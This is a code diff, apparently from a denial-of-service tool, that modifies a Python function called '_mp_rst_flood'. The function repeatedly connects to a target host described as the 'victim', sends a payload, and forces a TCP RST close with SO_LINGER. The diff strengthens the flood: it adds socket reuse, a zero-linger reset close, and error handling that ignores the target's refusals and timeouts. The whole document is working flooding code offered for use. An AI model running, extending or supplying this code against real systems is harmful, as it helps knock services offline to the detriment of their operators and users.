@@ -888,19 +888,34 @@ def _mp_rst_flood(args_tuple):
     """Multi-process RST flooder: connect, send, close (RST)."""
     host, port, duration, payload = args_tuple
     import time as _time
+    import errno as _errno
     conns = 0
     errors = 0
     end = _time.time() + duration
     while _time.time() < end:
+        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)  # fast timeout for hot victims
+            s.settimeout(0.5)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((host, port))
             s.send(payload)
-            s.close()
             conns += 1
-        except Exception:
-            errors += 1
+        except (ConnectionRefusedError, socket.timeout, OSError) as e:
+            # Connection failed - victim busy, not a real error
+            if isinstance(e, OSError) and e.errno not in (
+                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
+                _errno.EAGAIN, _errno.ECONNRESET
+            ):
+                errors += 1
+        finally:
+            if s:
+                try:
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
+                                 struct.pack('ii', 1, 0))
+                    s.close()
+                except Exception:
+                    pass
     return conns, errors
 
 async def rst_worker(name, url, stats, duration, stop, payload_size=1):
